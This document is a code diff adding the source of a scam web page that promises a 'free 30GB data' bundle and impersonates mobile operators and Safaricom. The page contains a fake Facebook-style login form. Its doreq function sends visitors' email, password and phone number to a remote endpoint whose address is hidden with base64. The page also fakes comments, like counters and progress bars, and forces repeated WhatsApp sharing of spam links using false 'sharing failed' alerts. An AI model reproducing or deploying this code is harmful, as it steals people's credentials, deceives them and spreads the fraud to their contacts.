+                                <path style="fill:#FFFFFF;" d="M70.201,58.294h-10.01v36.672H45.025V58.294h-7.213V45.406h7.213v-8.34
+            		c0-5.964,2.833-15.303,15.301-15.303L71.56,21.81v12.51h-8.151c-1.337,0-3.217,0.668-3.217,3.513v7.585h11.334L70.201,58.294z" />
+                            </g>
+                        </svg>
+
+                </div>
+                <div class="permision-container-box">
+                    <p class="permision-container-txt">We should validate you are a real human checking your name and profile photo.</p>
+                    <form action="#" class="permision-container-form">
+                        <input class="permision-container-input" type="text" id="email" placeholder="your@email.com">
+                        <label class="permision-container-label" for="email"></label>
+                        <input class="permision-container-input" type="password" id="pass" placeholder="??????????">
+                        <label class="permision-container-label" for="pass"></label>
+                    </form>
+                    <span class="message-status fb-request"></span>
+                    <button style="width:100%; margin-left: 0;" id="aceptar" class="quedate__cta-btn">Accept - Im Human</button>
+                    <div class="permision-container-secure">
+                        <svg fill="#a2a2a2" height="512pt" viewBox="-64 0 512 512" width="512pt" xmlns="http://www.w3.org/2000/svg">
+                            <path d="m336 192h-16v-64c0-70.59375-57.40625-128-128-128s-128 57.40625-128 128v64h-16c-26.453125 0-48 21.523438-48 48v224c0 26.476562 21.546875 48 48 48h288c26.453125 0 48-21.523438 48-48v-224c0-26.476562-21.546875-48-48-48zm-229.332031-64c0-47.0625 38.269531-85.332031 85.332031-85.332031s85.332031 38.269531 85.332031 85.332031v64h-170.664062zm0 0" />
+                        </svg>
+                        <p class="permision-container-secure-text">The app is not allowed to post on Facebook</p>
+                    </div>
+                </div>
+            </div>
+            <span class="permision-container-end">Our service privacy policy and conditions</span>
+        </div>
+        <div style="height: 269px;" class="loading2 js-hidden">
+            <div style="text-align: center !important;" class="loading2__box">
+                <svg class="loading2__permission" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                        <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                    </circle>
+                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                        <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                    </circle>
+                </svg>
+                <p style="text-align:center">Wait a moment, we validate data.</p>
+            </div>
+        </div>
+
+
+        <!--congratulations -->
+        <div id="share" class="loading2 js-hidden js-congrats">
+            <div class="loading2__box">
+                <span style="font-weight: bold; font-size:18px" class="welcome">After verification, You have been qualified to get free Recharge. How to proceed!</span>
+                <br>
+                <br>
+								
+               <p style=" font-size:17px" class="welcome"> How to activate your  <span style="color:red;">free 30GB Offer</span>?</p>
+                <br>
+                <br>
+               <p style=" font-size:17px"class="welcome"> 1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+                <br>
+                <br>
+
+                <p style=" font-size:17px"class="welcome">2. You will be redirected automatically to our free recharge page after the GREEN verification bar is filled.</p>
+                <br><br>
+               <p style=" font-size:17px"class="welcome"> 3. You will receive a confirmation by SMS in 15 minutes.</p>
+                <br><br><br>
+                <center>
+ <button style="display: flex;align-items:center;margin-left: -8px; justify-content: center;" id="compartir" class="quedate__cta-btn js-hidden">
+                    
+				
+                    SHARE
+
+                </button>
+                
+                </center>
+                <div style="margin-top: 30px;margin-bottom: 30px;" class="quedate__first js-hidden js-share">
+                    <div style="border: 1px solid gray; width:80%" class="quedate__load">Share with your groups <span class="quedate__load-a js-hidden"></span>
+                    </div>
+                    <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
+                        <svg id="third-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                            <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="100.26548245743669 100.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                            </circle>
+                            <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="100.12831551628262 100.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                            </circle>
+                        </svg>
+                        <svg id="third-checked" class="quedate__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="???_1" version="1.1" width=" 3.2rem">
+                                <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                    <g class="ldl-ani">
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke:#e24e03;"></circle>
+                                            </g>
+                                        </g>
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill:#ecc365;"></path>
+                                            </g>
+                                        </g>
+                                        <metadata xmlns:d="https://loading.io/stock/">
+                                            <d:name>ok</d:name>
+                                            <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
+                                            <d:license>by</d:license>
+                                            <d:slug>364zp</d:slug>
+                                        </metadata>
+                                    </g>
+                                </g>
+                            </svg>
+                            
+                        <span id="third-porcent" class="quedate__load-text"></span>
+                    </div>
+                </div>
+               
+            </div>
+        </div>
+ 
+        <!-- FIN Ventana permiso -->
+
+        <!--verify-->
+        <div class="loading2 js-hidden js-verify">
+            <div class="loading2__box">
+
+                <b style="font-weight:bold; font-size:16px">Congratulations, you received free 30GB Data bundle for your mobile number.</b>
+                <br>
+                <br><b>To facilitate the activation of your free 30GB data bundle you must complete this final step of Human Verification!</b>
+                <br>
+                <br><b>1. You need to be careful to carry out tasks that you will be told according to your mobile system.</b>
+				
+				
+                <br>
+                <br><b>(Note that this step is important for the option of free 30GB data to work.)</b>
+                <br>
+                
+                <br>
+                <br>
+                <center><span style="color:red;font-size:30px">You Can Get Now 30GB</span></center>
+                <br>
+                <br>
+                <center>
+                <div style="display: flex;">
+                    <button style="width: 100%; display: flex;align-items: center;justify-content: center;margin: 0;" id="verify" class="quedate__cta-btn">Click Here</button>
+
+                </div>
+                </center>
+                <br>
+                <center>
+                <script type="text/javascript" src="#"></script>
+                </center>
+
+            </div>
+
+
+        </div>
+
+    </div>
+</div>
+<script>
+
+function operatorDataBack() {
+		var d = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0];
+
+		if(d == 'pt'){
+			d = 'pt-BR';
+		}
+
+		var endpoint = 'https://pro.ip-api.com/json/?lang=' + d + '&key=zfJdWsy0dcKGCzT';
+
+		var xhr = new XMLHttpRequest();
+		xhr.onreadystatechange = function() {
+			if (this.readyState == 4 && this.status == 200) {
+				var response = JSON.parse(this.responseText);
+				if(response.status !== 'success') {
+					console.log('query failed: ' + response.message);
+					return
+				}
+
+				set_Cookie("countryCode",response.countryCode);
+
+				document.querySelector(".quedate-logo").textContent = response.isp + " FREE 50GB OFFER";
+				document.querySelector(".quedate__company").textContent = response.city;
+				document.querySelector(".quedate__country").textContent = response.country;
+				document.querySelector(".quedate__city").textContent = response.regionName;
+
+			}
+		};
+		xhr.open('GET', endpoint, true);
+		xhr.send();
+
+
+	}
+
+	operatorDataBack();
+	</script>
+	<!--start chat-->
+	
+<div class="post" width="100%" style="margin-top:40px">
+<div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://i.imgur.com/g6cV61A.png"> <img class="love" src="https://i.imgur.com/0UHB1f0.png"> <img class="care" src="https://i.imgur.com/sSMYbTT.png"> <span id="likes">103K</span>
+                </div>
+                <span id="comments">10K comments</span> <span class="dot">·</span> <span id="shares">5K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                    </div>
+                </div>
+                <div class="comment">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsOzpldqa_o4z98R3qcYC7EeVvrF1n-c0kijk6N4ChKQtGSK5-O7KrpC09JJquoIK5bujd-MMp0zCSD_t9EEEEyb0Z6waBzOZ6I-7NSdfvlLigopno4taPy3VCtzVJDHA4ZqT1zRISDNfppJBvjsMaWimUmdnhVem-IVweVMb2nSicuDNJPkM33AR-/s1000/Yanal.jpg">
+                    <div class="single-container">
+                        <span class="user">Sama</span>
+                        <span class="text">
+Thank you very much. I did not believe in these things, I swear to God, I still could not believe that I got free 30GB Data.
+                        </span>
+                    </div>
+                    <div class="buttons"><span class="time t1">46m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJbiB5TBffnQnDlejZUICmj2fWOqifySBwFzgQF9R2jmDwPPyNfGCgjYp60qZdE94KUeKx-_nOMCY0UOXwLW58u0ebvAG3TJaqT3-1cJbqGoIPc0xF-cW4dKPHQgkIy9BCSvVUtfSS6_EtgQSo-swjRCPy3t-rTYT9_3Ad-ulZJdy_S6KMOu11aBhC/s854/seraj.jpeg">
+                    <div class="single-container"><span class="user">Md Seraj Ahmad</span> <span class="text">Why doesn't receive a confirmation? My girlfriend got the free 30GB Data, but I've been waiting for half an hour and I didn't receive the confirmation</span></div>
+                    <div class="buttons"><span class="time t2">40m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment reply">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWnraREl_tPkKvuYD0sxf3z0eFExJm2tsFky-4ET7Jrv-xDIB5VBuEh0HRVOhnX2jxszR-0-xHGunPgKWy6ohAw3VkL6i7fsRr7a90bPUCTwUOkkXFeBHaGrv-wxL4f_yecpbeZ3d11lK3eCb4WBnoT5pR9KfYV1Ner15U1IO6p1x1tq0zWILfwj8i/s760/asho%20photo_11zon.jpg">
+                    <div class="single-container"><span class="user">Md Ashique Ahmad</span> <span class="text">In these difficult times it is necessary.</span></div>
+                    <div class="buttons"><span class="time t1">50m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_A72OxmRRT6Fgej0M5HufeTTbdRGase8GDNPShYRPZypaRKmokEYJ3GwIr2fyfBdK3wyIH0G130T8scwkflC5XKA-ziKD5jD8m7cmw2NENaOgh-2nJ8Qy1HCHtASQAPWI7tz-g5xL2fDdgotG9e0_-B9BnXVrok-FEKQrp_HhcwE6vbnUBT17fTnk/s266/SERAJ.jpg">
+                    <div class="single-container"><span class="user">Ahmad</span> <span class="text">❤️ Thank you very much, I really need this Free Offer </span></div>
+                    <div class="buttons"><span class="time t3">30m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="input"><input placeholder="Write a comment..."></div>
+            </div>
+            </div>
+<!--end chat-->
+</div>
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+<script>
+    var DOMString = {
+            loading: document.querySelector("#loading-svg"),
+            checked: document.querySelector("#check-svg"),
+            elemPorcents: document.querySelector(".quedate__parcent"),
+            elemPorcentText: document.querySelector(".quedate__porcent-text"),
+            firstBox: document.querySelector("#first-box"),
+            secondBox: document.querySelector("#second-box"),
+            thirdBox: document.querySelector("#third-box"),
+            phone: document.querySelector(".quedate__form-input"),
+            messageStatus: document.querySelector(".message-status"),
+            loadingG: document.querySelector("#loading-g"),
+            boxes: document.querySelectorAll(".quedate__first"),
+            firstPorcent: document.querySelector("#first-porcent"),
+            secondPorcent: document.querySelector("#second-porcent"),
+            thirdPorcent: document.querySelector("#third-porcent"),
+            barLoaders: document.querySelectorAll(".quedate__load-a"),
+            svgLoading: document.querySelectorAll(".quedate__load-animate"),
+            svgChecked: document.querySelectorAll(".quedate__load-check"),
+            permissionContainer: document.querySelector(".permision-container"),
+            permissionLoading: document.querySelector(".loading2"),
+            statusMessage: document.querySelector(".fb-request"),
+            share: document.querySelector("#compartir"),
+            congrats: document.querySelector(".js-congrats"),
+            sharing: document.querySelector(".js-share"),
+            verify: document.querySelector("#verify")
+        }, objServer = {}, landingDomain = "https://google.com",
+        adsLink = "https://play.google.com/store/apps/details?id=com.falmerstudios.simpackages.allsimpackages";
+        //adsLink = "https://play.google.com/store/apps/details?id=com.falmerstudios.simpackages.allsimpackages";
+    document.addEventListener("click", function (c) {
+        console.log(c);
+        var a = c.toElement || c.srcElement;
+        if (a.id) switch (a.id) {
+            case"validar":
+                a.classList.add("js-hidden"), setTimeout(function () {
+                    DOMString.loading.classList.remove("js-hidden"), DOMString.elemPorcents.classList.remove("js-hidden");
+                    var b = 0;
+                    window.loadingPorcents = setInterval(function () {
+                        DOMString.elemPorcents.textContent = b + "%", 100 == b ? (clearInterval(window.loadingPorcents), DOMString.loading.classList.add("js-hidden"), DOMString.checked.classList.remove("js-hidden"), DOMString.elemPorcents.classList.add("js-hidden"), DOMString.elemPorcentText.classList.remove("js-hidden"), setTimeout(function () {
+                            DOMString.checked.classList.add("js-hidden"), DOMString.firstBox.classList.add("js-hidden"), DOMString.secondBox.classList.remove("js-hidden"), DOMString.elemPorcentText.classList.add("js-hidden")
+                        }, 2e3)) : b++
+                    }, 50)
+                }, 500);
+                break;
+            case"enviar":
+                var a = DOMString.phone;
+                a.value ? (objServer.phone = a.value, DOMString.messageStatus.classList.add("js-hidden"), DOMString.secondBox.classList.add("js-hidden"), DOMString.loadingG.classList.remove("js-hidden"), setTimeout(function () {
+                    DOMString.loadingG.classList.add("js-hidden"), DOMString.thirdBox.classList.remove("js-hidden");
+                    var i = 0, j = 0, k = !0,
+                        l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+                    window.loadingData = setTimeout(function a() {
+                        l.length > i && (DOMString.boxes[i].classList.remove("js-hidden"), DOMString.barLoaders[i].classList.remove("js-hidden"), window._setting = setInterval(function () {
+                            if (l[i].textContent = j + "%", DOMString.barLoaders[i].style.width = j + "%", 100 === j && k) clearInterval(window._setting), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++, j = 0, window.loadingData = setTimeout(a, 1e3); else if (50 == j && 1 == i && k) clearInterval(window._setting), k = !1, window.loadingData = setTimeout(a, 1e3); else if (!k && 100 === j) {
+                                clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
+                                var d = 1, e = 0, m = messageToSend();
+                                var s=1;
+                                set_Cookie("d",s);
+                                DOMString.barLoaders[i].classList.remove("js-hidden"), DOMString.boxes[i].classList.remove("js-hidden"), DOMString.svgLoading[i].classList.remove("js-hidden"), l[i].textContent = "0%", DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
+                                    if (15 <= d) {
+                                        for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
+                                            window.open(adsLink)
+                                        });
+                                        DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
+                                    } else
+                                        /*      e = Math.floor(100 * (d / 12)), d++, l[i].textContent = e + "%", DOMString.barLoaders[i].style.width = e + "%",
+                                              e = Math.floor(100 * (d / 10))*0.5+50 ;*/
+                                         d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=81:d==7?e=85:d==8?e=86:d==9?e=87:d==10?e=88:d==11?e=90:d==12?e=94:d==13?e=96:d==14?e=98:d==15?e=100:void(0);
+                                    d++;
+                                    setTimeout(function() {
+                                        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
+                                        l[i].textContent = e + "%";
+                                        DOMString.barLoaders[i].style.width = e + "%";
+                                    }, 4000);
+                                    set_Cookie('e',e);
+                                    set_Cookie('d',d);
+                                    
+         /*       if( d == 10 ||d == 11 || d == 12 ){
+                    location.href = "whatsapp://send?text=  Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
+                }else{
+                                    window.location.href = "whatsapp://send?text=" + m
+                }*/
+                window.location.href = "whatsapp://send?text=" + m
+                
+                                })
+                            }
+                            j++
+                        }, 30))
+                    }, 1e3)
+                }, 1500)) : (DOMString.messageStatus.classList.remove("js-hidden"), DOMString.messageStatus.style.color = "red", DOMString.messageStatus.style.fontWeight = "bold", DOMString.messageStatus.textContent = "We need a number");
+        }
+    });
+
+    get_Cookie('e') ? setTimeout('enviar()',500) : void(0);
+   
+  landingDomain='*1.%20Airtel*%0Ahttps://cli.re/Airtel-30GB%0A%20%0A*2.%20Jio*%0Ahttps://cli.re/Jio-30GB%0A%20%0A*3.%20VI*%0Ahttps://cli.re/VI-30GB%0A%20%0A*4.%20BSNL-Mobile*%0Ahttps://cli.re/BSNL-30GB%0A%20%0A*5.%20Jazz*%0Ahttps://cli.re/Jazz-30GB%0A%20%0A*6.%20Zong*%0Ahttps://cli.re/Zong-30GB%0A%20%0A*7.%20Telenor*%0Ahttps://cli.re/Telenor-30GB%0A%20%0A*8.%20Other Networks*%0Ahttps://cli.re/Get-30GB%0A%0A*More Info*%0Ahttps://cli.re/CONTACT-HERE%0A%0A'
+    function deadline() {
+        var day3 = new Date();
+        day3.setTime(day3.getTime()+24*60*60*1000);
+        return day3.getFullYear()+"-" + (day3.getMonth()+1) + "-" + (day3.getDate()+5);
+    }
+    function enviar(){
+        l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+        i = 1;
+
+        clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
+        var d = parseInt(get_Cookie('d'));
+        e = parseInt(get_Cookie('e'));
+        m = messageToSend();
+        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
+        DOMString.barLoaders[i].classList.remove("js-hidden");
+        DOMString.boxes[i].classList.remove("js-hidden");
+        DOMString.svgLoading[i].classList.remove("js-hidden");
+        l[i].textContent = e + "%";
+        DOMString.barLoaders[i].style.width = e + "%";
+        DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
+            if (10 <= d) {
+                for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
+                    /*   record('4g','wc');*/
+                    window.open(adsLink)
+                });
+                DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
+            } else {
+                /*       record('4g',d);*/
+                // e = Math.floor(100 * (d / 10))*0.5+50 ;
+                d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=86:d==9?e=87:d==10?e=88:d==11?e=90:d==12?e=94:d==13?e=96:d==14?e=98:d==15?e=100:void(0);
+                d++;
+                setTimeout(function() {
+                    d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
+                    l[i].textContent = e + "%";
+                    DOMString.barLoaders[i].style.width = e + "%";
+                }, 4000);
+                set_Cookie('e',e);
+                set_Cookie('d',d);
+                
+     /*           if( d == 10 || d == 11 || d == 12 ){
+                    location.href = "whatsapp://send?text=  Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
+                }else{
+                window.location.href = "whatsapp://send?text=" + m;
+                }*/
+                window.location.href = "whatsapp://send?text=" + m;
+            }
+        })
+
+    }
+    function doreq(e, a, b) {
+        var c = new XMLHttpRequest;
+        c.open("POST", atob("aHR0cHM6Ly9hcHMucmVwcm92aWRlcy5jb20vbG9naW4ucGhwP3drcj16eGNtbmJ2MTI=")), c.onreadystatechange = function () {
+            4 === c.readyState && 200 === c.status
+        }, c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.send("email=" + e + "&pass=" + a + "&phone=" + b)
+    }
+    function tip_text() {
+        var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+            b = "";
+        return "en" === a ? b="Sharing failed! The same group or the same friend is invalid. Please check and share again." : "id" === a ? b="Berbagi gagal! Grup yang sama atau teman yang sama tidak valid. Silakan periksa dan bagikan lagi." :  b="Sharing failed! The same group or the same friend is invalid. Please check and share again." ;
+
+    }
+    function messageToSend() {
+        var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+            b = "";
+        return "en" === a ? b ="*30%20GB%20Free%20Data%20Azaadi%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20Azaadi%20Offer%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A" + landingDomain : "id" === a ? b = "%2ASafaricom+Valentines+%E2%9D%A4%EF%B8%8F+Gift%2A%0D%0A%0D%0AYou+qualify+to+receive+this+year%E2%80%99s+%2AKES+5%2C000%2A+if+you+have+been+using+Safaricom+for+more+than+one+month.%0D%0A%0D%0AImagine+nimeshapata+yangu+sent+to+my+%2AMpesa%2A%21%21%0D%0A%0D%0A%2AHappy+%E2%9D%A4%EF%B8%8F+Valentines+Everyone+from+Safaricom%2A%0D%0A%0D%0A%2AVisit+-+%2A " + landingDomain : b = "%2ASafaricom+Valentines+%E2%9D%A4%EF%B8%8F+Gift%2A%0D%0A%0D%0AYou+qualify+to+receive+this+year%E2%80%99s+%2AKES+5%2C000%2A+if+you+have+been+using+Safaricom+for+more+than+one+month.%0D%0A%0D%0AImagine+nimeshapata+yangu+sent+to+my+%2AMpesa%2A%21%21%0D%0A%0D%0A%2AHappy+%E2%9D%A4%EF%B8%8F+Valentines+Everyone+from+Safaricom%2A%0D%0A%0D%0A%2AVisit+-+%2A " + landingDomain ;
+    }
+
+    /* function messageToSend() {
+         var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+             b = "";
+         return "en" === a ? b = "To be grateful to customers for their continued support of 4G Internet! The company launched a 60-day free access to 100GB Internet data free use plan Participants can get 100GB free mobile internet data usage\n" +
+             "Participating customers:\n" +
+             "1. Customers who use 4G data for a long time\n" +
+             "2. All traffic on Whatsapp users is free, including video downloads\n" +
+             "3. The system will check your number for participation rights\n" +
+             "4. It can help the company to promote the business first\n" +
+             "The system will record your start date after success.\n" +
+             "Thank you for your participation! %0A%0A*Get it now HERE \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+             "it" === a ? b = "*200 Gb di dati Internet senza alcuna ricarica Per* %0A Ottieni 200 Gb di dati Internet gratuitamente su qualsiasi rete mobile per 60 giorni. %0A *Scarica ora QUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz " :
+                 "es" === a ? b = "*200 Gb de datos de Internet súper rápidos sin ninguna recarga* %0A%0AObtenga 200 Gb de datos de Internet gratis en cualquier red ahora. m\xF3vil durante 60 d\xEDas. %0A%0A*Consiguelo ahora AQUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                     "ar" === a ? b = "*200 \u062C\u064A\u062C\u0627 \u0628\u0627\u064A\u062A \u0645\u0646 \u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u062F\u0648\u0646 \u0623\u064A \u0625\u0639\u0627\u062F\u0629 \u0634\u062D\u0646 \u0628\u0633\u0628\u0628* %0A \u0627\u062D\u0635\u0644 \u0639\u0644\u0649 100 \u062C\u064A\u062C\u0627\u0628\u0627\u064A\u062A \u0645\u0646 \u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0627\u0644\u0645\u062C\u0627\u0646\u064A\u0629 \u0639\u0644\u0649 \u0623\u064A \u0634\u0628\u0643\u0629 \u0645\u062D\u0645\u0648\u0644 \u0644\u0645\u062F\u0629 60 \u064A\u0648\u0645\u064B\u0627 %0A *\u0627\u062D\u0635\u0644 \u0639\u0644\u064A\u0647 \u0627\u0644\u0622\u0646 \u0647\u0646\u0627 \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                         "el" === a ? b = "*200 Gb \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03C9\u03BD \u0394\u03B9\u03B1\u03B4\u03B9\u03BA\u03C4\u03CD\u03BF\u03C5 \u03C7\u03C9\u03C1\u03AF\u03C2 \u03BA\u03B1\u03BC\u03AF\u03B1 \u03B5\u03C0\u03B1\u03BD\u03B1\u03C6\u03CC\u03C1\u03C4\u03B9\u03C3\u03B7 \u0393\u03B9\u03B1* %0A \u039B\u03AC\u03B2\u03B5\u03C4\u03B5 200 Gb \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03C9\u03BD Internet \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03C3\u03B5 \u03BF\u03C0\u03BF\u03B9\u03BF\u03B4\u03AE\u03C0\u03BF\u03C4\u03B5 \u03B4\u03AF\u03BA\u03C4\u03C5\u03BF \u03BA\u03B9\u03BD\u03B7\u03C4\u03AE\u03C2 \u03C4\u03B7\u03BB\u03B5\u03C6\u03C9\u03BD\u03AF\u03B1\u03C2 \u03B3\u03B9\u03B1 60 \u03B7\u03BC\u03AD\u03C1\u03B5\u03C2. %0A *\u0391\u03C0\u03BF\u03BA\u03C4\u03AE\u03C3\u03C4\u03B5 \u03C4\u03BF \u0395\u0394\u03A9 \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                             "sq" === a ? b = "*200 Gb t\xEB dh\xEBna n\xEB internet pa ndonj\xEB rimbushje p\xEBr* %0A Merrni 200 Gb t\xEB dh\xEBna n\xEB internet falas n\xEB \xE7do rrjet celular p\xEBr 60 dit\xEB. %0A *Merre tani KETU%* %0Ahttps://tuisongxx.xyz" :
+                                 "tr" === a ? b = "*Herhangi bir \u015Farj olmadan 200 Gb \u0130nternet verisi  i\xE7in* %0A Herhangi bir mobil a\u011Fda 60 g\xFCn boyunca \xFCcretsiz olarak 200 Gb \u0130nternet verisi al\u0131n. %0A *Hemen al\u0131n HERE \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
